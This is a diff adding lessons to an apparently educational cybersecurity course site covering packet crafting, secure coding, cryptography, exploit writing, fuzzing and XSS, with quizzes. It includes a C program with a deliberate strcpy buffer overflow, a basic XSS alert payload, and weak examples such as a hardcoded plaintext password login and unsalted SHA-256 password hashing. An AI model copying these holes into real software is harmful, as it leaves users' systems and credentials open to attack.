+                    <li><strong>Network Behavior Analysis:</strong> Understanding how different types of traffic interact with network infrastructure, aiding in network optimization and security assessments.</li>
+                </ul>
+
+                <div class="try-it">
+                    <h5>Try It Out:</h5>
+                    <p>Create a simple packet and send it:</p>
+                    <textarea id="packet-manipulation-code" rows="5" cols="50"># Example code
+from scapy.all import *
+
+packet = IP(dst='8.8.8.8')/ICMP()
+send(packet)</textarea><br>
+                    <button onclick="executeCode('packet-manipulation-code')">Run Code</button>
+                    <pre id="packet-manipulation-output"></pre>
+                </div>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p12">
+            <div class="question">
+                <label for="q12"><h5>Question:</h5> What is the main purpose of packet manipulation in cybersecurity?</label><br>
+                <form id='q12' class="task-form">
+                    <input type="radio" name="task12" value="correct"> To analyze and test network behavior.<br>
+                    <input type="radio" name="task12" value="wrong"> To encrypt sensitive data.<br>
+                    <input type="radio" name="task12" value="wrong"> To store packets in a database.<br>
+                    <span class="feedback" id="q12-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-12 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+</section>
+
+
+
+<section>
+    <h2>5. Secure Coding Practices</h2>
+
+ 
+    <article>
+        <h3 course-id="p13"  class="locked">5.1 Input Validation</h3>
+        <div class="theory p13">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Input validation is the process of ensuring that any data received from users or external systems is accurate, safe, and conforms to expected formats. It is a crucial step in preventing various types of attacks, including SQL injection and command injection.</p>
+
+                <h4>Techniques:</h4>
+                <ul>
+                    <li><strong>Whitelisting:</strong> Accepting only known good inputs (e.g., specific formats, allowed characters) and rejecting everything else. This is the most effective method.</li>
+                    <li><strong>Type Checking:</strong> Ensuring that the input matches the expected data type (e.g., integers, strings) before processing.</li>
+                    <li><strong>Length Checking:</strong> Verifying that input length is within acceptable bounds to avoid buffer overflows or other related vulnerabilities.</li>
+                </ul>
+
+                <h4>Example:</h4>
+                <pre><code class="language-python">
+import re
+
+def validate_username(username):
+    # Only allow alphanumeric characters and underscores
+    if re.match(r'^[a-zA-Z0-9_]+$', username):
+        return True
+    else:
+        raise ValueError("Invalid username!")
+
+try:
+    validate_username("user_name123")  # Valid username
+    validate_username("user!name")      # Invalid username
+except ValueError as e:
+    print(e)
+                </code></pre>
+
+                
+                <h4>Try It Out:</h4>
+                <textarea rows="8" cols="50">
+import re
+
+def validate_username(username):
+    if re.match(r'^[a-zA-Z0-9_]+$', username):
+        return True
+    else:
+        raise ValueError("Invalid username!")
+try:
+    validate_username("user_name123")
+    validate_username("user!name")
+except ValueError as e:
+    print(e)
+                </textarea>
+                <p>Copy the code above and try it in your Python environment.</p>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>Prevents attackers from injecting malicious data that can compromise the application or its database.</li>
+                    <li>Helps maintain application integrity by ensuring only valid data is processed.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p13">
+            <div class="question">
+                <label for="q13"><h5>Question:</h5> What is the primary goal of input validation?</label><br>
+                <form id='q13' class="task-form">
+                    <input type="radio" name="task13" value="correct"> To ensure that user input is accurate, safe, and conforms to expected formats.<br>
+                    <input type="radio" name="task13" value="wrong"> To automatically reject all inputs.<br>
+                    <input type="radio" name="task13" value="wrong"> To limit input to only integers.<br>
+                    <span class="feedback" id="q13-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p13 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+   
+    <article>
+        <h3 course-id="p14"  class="locked">5.2 Authentication and Authorization</h3>
+        <div class="theory p14">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Authentication is the process of verifying a user's identity, while authorization determines what resources a user can access after their identity has been confirmed.</p>
+
+                <h4>Best Practices:</h4>
+                <ul>
+                    <li><strong>Strong Password Policies:</strong> Enforcing complex passwords and regular password changes to enhance security.</li>
+                    <li><strong>Multi-Factor Authentication (MFA):</strong> Requiring additional verification methods (e.g., SMS, authenticator apps) to enhance security beyond just passwords.</li>
+                    <li><strong>Least Privilege Principle:</strong> Granting users the minimum level of access necessary to perform their tasks, limiting potential damage from compromised accounts.</li>
+                </ul>
+
+                <h4>Example:</h4>
+                <pre><code class="language-python">
+from flask import Flask, request, abort
+
+app = Flask(__name__)
+
+users = {'admin': 'password123'}
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+    if username in users and users[username] == password:
+        return "Login successful!"
+    else:
+        abort(401)  # Unauthorized access
+
+app.run()
+                </code></pre>
+
+                <!-- Code Try Out Section -->
+                <h4>Try It Out:</h4>
+                <textarea rows="8" cols="50">
+from flask import Flask, request, abort
+
+app = Flask(__name__)
+
+users = {'admin': 'password123'}
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+    if username in users and users[username] == password:
+        return "Login successful!"
+    else:
+        abort(401)
+
+app.run()
+                </textarea>
+                <p>Copy the code above and try it in your Flask environment.</p>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>Ensures that only legitimate users can access sensitive resources, protecting against unauthorized access and data breaches.</li>
+                    <li>Helps mitigate risks associated with compromised accounts by implementing additional verification layers.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p14">
+            <div class="question">
+                <label for="q14"><h5>Question:</h5> What is the role of multi-factor authentication (MFA)?</label><br>
+                <form id='q14' class="task-form">
+                    <input type="radio" name="task14" value="correct"> To enhance security by requiring additional verification methods beyond just passwords.<br>
+                    <input type="radio" name="task14" value="wrong"> To store passwords more securely.<br>
+                    <input type="radio" name="task14" value="wrong"> To allow users to access resources without logging in.<br>
+                    <span class="feedback" id="q14-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-14 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    
+    <article>
+        <h3 course-id="p15"  class="locked">5.3 Error Handling</h3>
+        <div class="theory p15">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Error handling involves managing errors in a way that does not expose sensitive information or create vulnerabilities in the application. Proper error handling can prevent attackers from gaining insights into the application's internal workings.</p>
+
+                <h4>Best Practices:</h4>
+                <ul>
+                    <li><strong>Generic Error Messages:</strong> Displaying generic error messages to users (e.g., “An error occurred”) while logging detailed error information internally for debugging purposes.</li>
+                    <li><strong>Exception Handling:</strong> Using try-except blocks to gracefully handle exceptions and prevent application crashes.</li>
+                    <li><strong>Input Validation Errors:</strong> Providing clear but non-sensitive feedback for invalid inputs without revealing underlying system vulnerabilities.</li>
+                </ul>
+
+                <h4>Example:</h4>
+                <pre><code class="language-python">
+try:
+    # Code that may raise an exception
+    result = 10 / 0
+except ZeroDivisionError:
+    print("An error occurred. Please try again.")
+                </code></pre>
+
+                
+                <h4>Try It Out:</h4>
+                <textarea rows="8" cols="50">
+try:
+    result = 10 / 0
+except ZeroDivisionError:
+    print("An error occurred. Please try again.")
+                </textarea>
+                <p>Copy the code above and try it in your Python environment.</p>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>Protects sensitive information (e.g., stack traces, database errors) from being exposed to users, which could aid attackers in crafting exploits.</li>
+                    <li>Enhances user experience by providing meaningful feedback without compromising security.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p16">
+            <div class="question">
+                <label for="q16"><h5>Question:</h5> Why should detailed error messages not be displayed to users?</label><br>
+                <form id='q16' class="task-form">
+                    <input type="radio" name="task16" value="correct"> Because they may reveal sensitive information about the system.<br>
+                    <input type="radio" name="task16" value="wrong"> Because users prefer seeing generic errors.<br>
+                    <input type="radio" name="task16" value="wrong"> Because error messages are not useful for users.<br>
+                    <span class="feedback" id="q16-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p16 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </article>
+
+   
+    <article>
+        <h3 course-id="p17"  class="locked">5.4 Memory Management</h3>
+        <div class="theory p17">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Memory management refers to the practices of controlling how memory is allocated and deallocated within a program. Proper memory management helps prevent vulnerabilities like memory leaks and buffer overflows.</p>
+
+                <h4>Best Practices:</h4>
+                <ul>
+                    <li><strong>Freeing Memory:</strong> Ensuring that dynamically allocated memory is properly freed after use to prevent memory leaks.</li>
+                    <li><strong>Bounds Checking:</strong> Always verifying that memory access stays within defined bounds to avoid buffer overflows and memory corruption.</li>
+                    <li><strong>Use After Free:</strong> Avoiding access to memory that has already been deallocated, which can lead to undefined behavior.</li>
+                </ul>
+
+                <h4>Example:</h4>
+                <pre><code class="language-c">
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    int *ptr = malloc(sizeof(int) * 10);
+    if (ptr == NULL) {
+        printf("Memory allocation failed.\n");
+        return 1;
+    }
+
+    // Use the allocated memory
+    for (int i = 0; i < 10; i++) {
+        ptr[i] = i;
+    }
+
+    // Free the allocated memory
+    free(ptr);
+
+    return 0;
+}
+                </code></pre>
+
+                
+                <h4>Try It Out:</h4>
+                <textarea rows="8" cols="50">
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    int *ptr = malloc(sizeof(int) * 10);
+    if (ptr == NULL) {
+        printf("Memory allocation failed.\n");
+        return 1;
+    }
+
+    for (int i = 0; i < 10; i++) {
+        ptr[i] = i;
+    }
+
+    free(ptr);
+
+    return 0;
+}
+                </textarea>
+                <p>Copy the code above and try it in your C environment.</p>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>Improper memory management can lead to memory corruption, crashes, or exploitable vulnerabilities like buffer overflows.</li>
+                    <li>Freeing memory correctly ensures that resources are used efficiently and are available when needed.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p17">
+            <div class="question">
+                <label for="q17"><h5>Question:</h5> Why is proper memory management important?</label><br>
+                <form id='q17' class="task-form">
+                    <input type="radio" name="task17" value="correct"> To prevent memory corruption, crashes, and vulnerabilities like buffer overflows.<br>
+                    <input type="radio" name="task17" value="wrong"> To avoid spending money on expensive hardware.<br>
+                    <input type="radio" name="task17" value="wrong"> To prevent memory from being too fast.<br>
+                    <span class="feedback" id="q17-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p17 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+</section>
+
+
+<section id="cryptography-basics">
+    <h2>6. Cryptography Basics</h2>
+
+  
+    <article>
+        <h3 course-id="p18"  class="locked">6.1 Encryption and Decryption</h3>
+        <div class="theory p18">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Encryption is the process of converting plaintext data into ciphertext using an algorithm and a key, making the data unreadable to unauthorized users. Decryption is the reverse process, where ciphertext is converted back to plaintext using the appropriate key.</p>
+
+                <h4>Types of Encryption:</h4>
+                <ul>
+                    <li><strong>Symmetric Encryption:</strong> The same key is used for both encryption and decryption. Examples include AES (Advanced Encryption Standard) and DES (Data Encryption Standard).</li>
+                    <li><strong>Asymmetric Encryption:</strong> Uses a pair of keys—a public key for encryption and a private key for decryption. RSA (Rivest-Shamir-Adleman) is a well-known asymmetric encryption algorithm.</li>
+                </ul>
+
+                <h4>Libraries:</h4>
+                <p>In Python, the PyCryptodome library is commonly used for cryptographic operations.</p>
+
+                <h4>Example (Symmetric Encryption with AES):</h4>
+                <pre><code class="language-python">
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
+
+# Key and data
+key = get_random_bytes(16)  # AES-128 requires a 16-byte key
+cipher = AES.new(key, AES.MODE_CBC)
+data = b'Secure Message!'
+
+# Encryption
+ciphertext = cipher.encrypt(pad(data, AES.block_size))
+iv = cipher.iv  # Initialization vector for decryption
+
+# Decryption
+cipher_dec = AES.new(key, AES.MODE_CBC, iv)
+plaintext = unpad(cipher_dec.decrypt(ciphertext), AES.block_size)
+
+print(f'Ciphertext: {ciphertext.hex()}')
+print(f'Plaintext: {plaintext.decode()}')
+                </code></pre>
+
+                
+                <h4>Try It Out:</h4>
+                <textarea rows="8" cols="50">
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
+
+# Key and data
+key = get_random_bytes(16)  # AES-128 requires a 16-byte key
+cipher = AES.new(key, AES.MODE_CBC)
+data = b'Secure Message!'
+
+# Encryption
+ciphertext = cipher.encrypt(pad(data, AES.block_size))
+iv = cipher.iv  # Initialization vector for decryption
+
+# Decryption
+cipher_dec = AES.new(key, AES.MODE_CBC, iv)
+plaintext = unpad(cipher_dec.decrypt(ciphertext), AES.block_size)
+
+print(f'Ciphertext: {ciphertext.hex()}')
+print(f'Plaintext: {plaintext.decode()}')
+                </textarea>
+                <p>Copy the code above and try it in your Python environment. Experiment with different messages to observe the encryption and decryption process.</p>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>Protects sensitive information during transmission and storage, ensuring confidentiality.</li>
+                    <li>Essential for secure communications in applications such as online banking, messaging, and data storage.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>        
+        </div>
+
+        
+        <div class="task" task-id="p18">
+            <div class="question">
+                <label for="q18"><h5>Question:</h5> What is encryption?</label><br>
+                <form id='q18' class="task-form">
+                    <input type="radio" name="task18" value="correct"> The process of converting plaintext data into ciphertext using an algorithm and a key.<br>
+                    <input type="radio" name="task18" value="wrong"> The process of converting ciphertext back to plaintext.<br>
+                    <input type="radio" name="task18" value="wrong"> A method for compressing data for storage.<br>
+                    <span class="feedback" id="q1-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p18 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+            </div>
+        </div>
+    </article>
+
+   
+    <article>
+        <h3 course-id="p19"  class="locked">6.2 Hash Functions</h3>
+        <div class="theory p19">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Cryptographic hash functions take an input (or message) and produce a fixed-size string of characters, which is typically a digest that is unique to each unique input. Hash functions are one-way functions, meaning they cannot be reversed.</p>
+
+                <h4>Common Hash Functions:</h4>
+                <ul>
+                    <li><strong>SHA-256:</strong> Part of the SHA-2 family, widely used for data integrity and secure password storage.</li>
+                    <li><strong>MD5:</strong> An older hash function that is no longer considered secure due to vulnerabilities and collision attacks.</li>
+                </ul>
+
+                <h4>Usage:</h4>
+                <ul>
+                    <li><strong>Password Storage:</strong> Hashing passwords before storing them in databases ensures that even if the database is compromised, the actual passwords remain secure.</li>
+                    <li><strong>Data Integrity:</strong> Hashes can be used to verify that data has not been altered during transmission.</li>
+                </ul>
+
+                <h4>Example (Hashing with SHA-256):</h4>
+                <pre><code class="language-python">
+import hashlib
+
+# Hashing a password
+password = 'my_secure_password'
+hashed_password = hashlib.sha256(password.encode()).hexdigest()
+
+print(f'Original Password: {password}')
+print(f'Hashed Password: {hashed_password}')
+                </code></pre>
+
+                
+                <h4>Try It Out:</h4>
+                <textarea rows="8" cols="50">
+import hashlib
+
+# Hashing a password
+password = 'my_secure_password'
+hashed_password = hashlib.sha256(password.encode()).hexdigest()
+
+print(f'Original Password: {password}')
+print(f'Hashed Password: {hashed_password}')
+                </textarea>
+                <p>Copy the code above and try it in your Python environment. Experiment with different passwords to see how the hashes change.</p>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>Ensures data integrity by providing a way to check if data has been tampered with.</li>
+                    <li>Provides security for stored passwords, making it difficult for attackers to recover the original passwords even if they gain access to the hash values.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>        
+        </div>
+
+        
+        <div class="task" task-id="p19">
+            <div class="question">
+                <label for="q19"><h5>Question:</h5> What is a cryptographic hash function?</label><br>
+                <form id='q19' class="task-form">
+                    <input type="radio" name="task19" value="correct"> A one-way function that produces a fixed-size string based on input data.<br>
+                    <input type="radio" name="task19" value="wrong"> A function that can be reversed to retrieve original input data.<br>
+                    <input type="radio" name="task19" value="wrong"> A method for encrypting data to make it unreadable.<br>
+                    <span class="feedback" id="q19-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-19 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    
+    <article>
+        <h3 course-id="p20"  class="locked">6.3 Key Management</h3>
+        <div class="theory p20">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Key management refers to the process of generating, distributing, storing, using, and retiring encryption keys securely. Proper key management is critical for maintaining the security of encrypted data.</p>
+
+                <h4>Best Practices:</h4>
+                <ul>
+                    <li><strong>Key Generation:</strong> Use secure algorithms and sufficient key lengths to prevent brute-force attacks. For example, a key length of at least 256 bits for AES is recommended.</li>
+                    <li><strong>Secure Storage:</strong> Keys should be stored securely using key management systems (KMS) or hardware security modules (HSM) to prevent unauthorized access.</li>
+                    <li><strong>Access Control:</strong> Implement strict access controls to limit who can access encryption keys, ensuring that only authorized personnel or systems can use them.</li>
+                    <li><strong>Regular Rotation:</strong> Regularly rotate keys and retire old keys to minimize the risk of compromise over time.</li>
+                </ul>
+
+                <h4>Example (Using Fernet for Key Generation and Management):</h4>
+                <pre><code class="language-python">
+from cryptography.fernet import Fernet
+
+# Key generation
+key = Fernet.generate_key()
+fernet = Fernet(key)
+
+# Encrypting data
+original_data = b'Sensitive Data'
+encrypted_data = fernet.encrypt(original_data)
+
+# Decrypting data
+decrypted_data = fernet.decrypt(encrypted_data)
+
+print(f'Encrypted: {encrypted_data}')
+print(f'Decrypted: {decrypted_data.decode()}')
+                </code></pre>
+
+                
+                <h4>Try It Out:</h4>
+                <textarea rows="8" cols="50">
+from cryptography.fernet import Fernet
+
+# Key generation
+key = Fernet.generate_key()
+fernet = Fernet(key)
+
+# Encrypting data
+original_data = b'Sensitive Data'
+encrypted_data = fernet.encrypt(original_data)
+
+# Decrypting data
+decrypted_data = fernet.decrypt(encrypted_data)
+
+print(f'Encrypted: {encrypted_data}')
+print(f'Decrypted: {decrypted_data.decode()}')
+                </textarea>
+                <p>Copy the code above and try it in your Python environment. Play with the data you encrypt and decrypt to see how it works.</p>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>Proper key management ensures that encryption remains effective and that data protection measures are not compromised by weak or mishandled keys.</li>
+                    <li>Essential for compliance with regulations that require secure data handling practices, such as GDPR and HIPAA.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+       
+        <div class="task" task-id="p20">
+            <div class="question">
+                <label for="q20"><h5>Question:</h5> Why is key management important?</label><br>
+                <form id='q20' class="task-form">
+                    <input type="radio" name="task20" value="correct"> It ensures that encryption remains effective and data protection measures are not compromised.<br>
+                    <input type="radio" name="task20" value="wrong"> It simplifies the encryption process for users.<br>
+                    <input type="radio" name="task20" value="wrong"> It eliminates the need for encryption entirely.<br>
+                    <span class="feedback" id="q20-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p20 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+</section>
+
+
+
+
+<section id="vulnerability-research-exploit-development">
+    <h2>7. Vulnerability Research and Exploit Development</h2>
+
+   
+    <article>
+        <h3 course-id="p21"  class="locked">7.1 Writing Exploits</h3>
+        <div class="theory p21">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Writing exploits involves creating code that takes advantage of vulnerabilities in software applications. This can include various techniques like buffer overflows, format string attacks, and other exploitation methods.</p>
+
+                <h4>Common Vulnerabilities:</h4>
+                <ul>
+                    <li><strong>Buffer Overflow:</strong> Occurs when a program writes more data to a buffer than it can hold, potentially allowing an attacker to execute arbitrary code or crash the program.</li>
+                    <li><strong>Format String Vulnerability:</strong> Arises when user input is improperly used in formatted output functions (e.g., printf in C), allowing attackers to read memory or execute arbitrary code.</li>
+                </ul>
+
+                <h4>Key Concepts:</h4>
+                <ul>
+                    <li><strong>Memory Layout:</strong> Understanding how the operating system manages memory, including the stack, heap, and data segments, is crucial for crafting effective exploits.</li>
+                    <li><strong>Return-Oriented Programming (ROP):</strong> A technique that uses existing executable code in memory to execute a payload without injecting new code, helping to bypass security mechanisms like DEP (Data Execution Prevention).</li>
+                </ul>
+
+                <h4>Example (Basic Buffer Overflow Exploit in C):</h4>
+                <pre><code class="language-c">
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void secret_function() {
+    printf("Exploit Successful!\n");
+    // Code to exploit
+}
+
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // No bounds checking!
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        printf("Usage: %s &lt;input&gt;\n", argv[0]);
+        return 1;
+    }
+    vulnerable_function(argv[1]);
+    return 0;
+}
+                </code></pre>
+
+                
+                <h4>Try It Out:</h4>
+                <textarea rows="8" cols="50">
+#include <stdio.h>
+#include <string.h>
+
+void secret_function() {
+    printf("Exploit Successful!\n");
+}
+
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // No bounds checking!
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        printf("Usage: %s <input>\n", argv[0]);
+        return 1;
+    }
+    vulnerable_function(argv[1]);
+    return 0;
+}
+                </textarea>
+                <p>Copy the code above and try it in your C environment. Experiment with different inputs to observe the behavior.</p>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>Understanding how to write exploits is essential for penetration testers and security researchers to assess and improve the security of applications.</li>
+                    <li>It helps developers understand the consequences of coding errors and reinforces the need for secure coding practices.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p21">
+            <div class="question">
+                <label for="q21"><h5>Question:</h5> What is a buffer overflow?</label><br>
+                <form id='q21' class="task-form">
+                    <input type="radio" name="task21" value="correct"> A condition where a program writes more data to a buffer than it can hold.<br>
+                    <input type="radio" name="task21" value="wrong"> A method for securely storing data.<br>
+                    <input type="radio" name="task21" value="wrong"> A technique for encrypting data.<br>
+                    <span class="feedback" id="q21-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p21 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    
+    <article>
+        <h3 course-id="p22"  class="locked">7.2 Reverse Engineering</h3>
+        <div class="theory p22">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Reverse engineering is the process of analyzing binary executables to understand their functionality, identify vulnerabilities, or study malware behavior. This involves disassembling code, examining its structure, and understanding its operations.</p>
+
+                <h4>Techniques:</h4>
+                <ul>
+                    <li><strong>Disassembly:</strong> Using tools like IDA Pro, Ghidra, or Radare2 to convert binary code back into assembly language, allowing researchers to analyze the logic of the program.</li>
+                    <li><strong>Dynamic Analysis:</strong> Running the binary in a controlled environment (e.g., a virtual machine or sandbox) to observe its behavior, interactions with the system, and network activity.</li>
+                    <li><strong>Static Analysis:</strong> Examining the binary without executing it to identify patterns, vulnerabilities, or malicious code.</li>
+                </ul>
+
+                <h4>Example (Using Ghidra for Static Analysis):</h4>
+                <p>1. Load the binary executable into Ghidra.</p>
+                <p>2. Use the decompiler to analyze functions and identify potential vulnerabilities.</p>
+                <p>3. Look for common vulnerabilities like buffer overflows or improper input validation.</p>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>Reverse engineering is critical for discovering vulnerabilities in software and understanding how malware operates, which can lead to improved defenses and detection mechanisms.</li>
+                    <li>It enhances the ability to develop patches for vulnerabilities and contributes to the overall security posture of systems.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p22">
+            <div class="question">
+                <label for="q22"><h5>Question:</h5> What is the primary purpose of reverse engineering?</label><br>
+                <form id='q22' class="task-form">
+                    <input type="radio" name="task22" value="correct"> To analyze binary executables for vulnerabilities and understand their functionality.<br>
+                    <input type="radio" name="task22" value="wrong"> To enhance the user interface of applications.<br>
+                    <input type="radio" name="task22" value="wrong"> To improve application performance without changing the code.<br>
+                    <span class="feedback" id="q22-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p22 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    
+    <article>
+        <h3 course-id="p23" class="locked">7.3 Fuzzing</h3>
+        <div class="theory p23">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Fuzzing is an automated testing technique that involves sending random or malformed inputs to a program to discover vulnerabilities. It helps identify crashes, assertion failures, or potential security issues in applications.</p>
+
+                <h4>Types of Fuzzing:</h4>
+                <ul>
+                    <li><strong>Black-Box Fuzzing:</strong> Treats the application as a "black box," sending random data without knowledge of the internal workings. It is useful for finding unexpected crashes.</li>
+                    <li><strong>White-Box Fuzzing:</strong> Uses knowledge of the source code or application structure to generate targeted inputs that explore specific code paths, increasing the chances of discovering vulnerabilities.</li>
+                </ul>
+
+                <h4>Tools:</h4>
+                <ul>
+                    <li><strong>AFL (American Fuzzy Lop):</strong> A popular fuzzer that uses genetic algorithms to efficiently explore code paths and identify potential vulnerabilities.</li>
+                    <li><strong>libFuzzer:</strong> A library for in-process fuzzing, integrated with LLVM, allowing for rapid development of fuzzing tests.</li>
+                </ul>
+
+                <h4>Example (Using AFL):</h4>
+                <ol>
+                    <li>Compile the target program with AFL’s instrumentation.</li>
+                    <li>Run AFL with a set of initial test cases.</li>
+                    <li>Analyze the output for crashes or potential vulnerabilities.</li>
+                </ol>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>Fuzzing is an effective method for discovering vulnerabilities that might not be identified through traditional testing methods, contributing to the security of applications.</li>
+                    <li>It automates the vulnerability discovery process, saving time and resources while increasing the chances of identifying security flaws.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p23">
+            <div class="question">
+                <label for="q23"><h5>Question:</h5> What is fuzzing primarily used for?</label><br>
+                <form id='q23' class="task-form">
+                    <input type="radio" name="task23" value="correct"> To discover vulnerabilities by sending random or malformed inputs to a program.<br>
+                    <input type="radio" name="task23" value="wrong"> To optimize the performance of applications.<br>
+                    <input type="radio" name="task23" value="wrong"> To create a user-friendly interface.<br>
+                    <span class="feedback" id="q23-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p23 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+</section>
+
+
+
+
+<section id="web-security-development">
+    <h2>8. Web Security and Development</h2>
+
+    <article>
+        <h3 course-id="p24"  class="locked">8.1 Cross-Site Scripting (XSS)</h3>
+        <div class="theory p24">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can steal cookies, session tokens, or redirect users to malicious websites.</p>
+
+                <h4>Types of XSS:</h4>
+                <ul>
+                    <li><strong>Stored XSS:</strong> Malicious scripts are stored on the server (e.g., in a database) and executed when users retrieve the stored data.</li>
+                    <li><strong>Reflected XSS:</strong> Malicious scripts are reflected off a web server in response to a user’s request. This is often delivered via URL parameters or form submissions.</li>
+                    <li><strong>DOM-based XSS:</strong> The vulnerability exists in the client-side code (JavaScript), where the attacker manipulates the DOM to execute malicious scripts.</li>
+                </ul>
+
+                <h4>Identifying XSS Vulnerabilities:</h4>
+                <ul>
+                    <li>Check for user input fields that reflect user input in the response without proper encoding or escaping.</li>
+                    <li>Use tools like Burp Suite or OWASP ZAP to scan web applications for XSS vulnerabilities.</li>
+                </ul>
+
+                <h4>Example of a Basic XSS Payload:</h4>
+                <pre><code class="language-html">
+&lt;script&gt;alert('XSS Vulnerability!');&lt;/script&gt;
+                </code></pre>
+
+                <h4>Preventing XSS:</h4>
+                <ul>
+                    <li><strong>Input Validation:</strong> Validate and sanitize user inputs to ensure they do not contain malicious scripts.</li>
+                    <li><strong>Output Encoding:</strong> Encode user inputs when displaying them in web pages (e.g., using HTML entity encoding).</li>
+                    <li><strong>Content Security Policy (CSP):</strong> Implement CSP headers to restrict where scripts can be loaded from.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p24">
+            <div class="question">
+                <label for="q24"><h5>Question:</h5> What is Cross-Site Scripting (XSS)?</label><br>
+                <form id='q24' class="task-form">
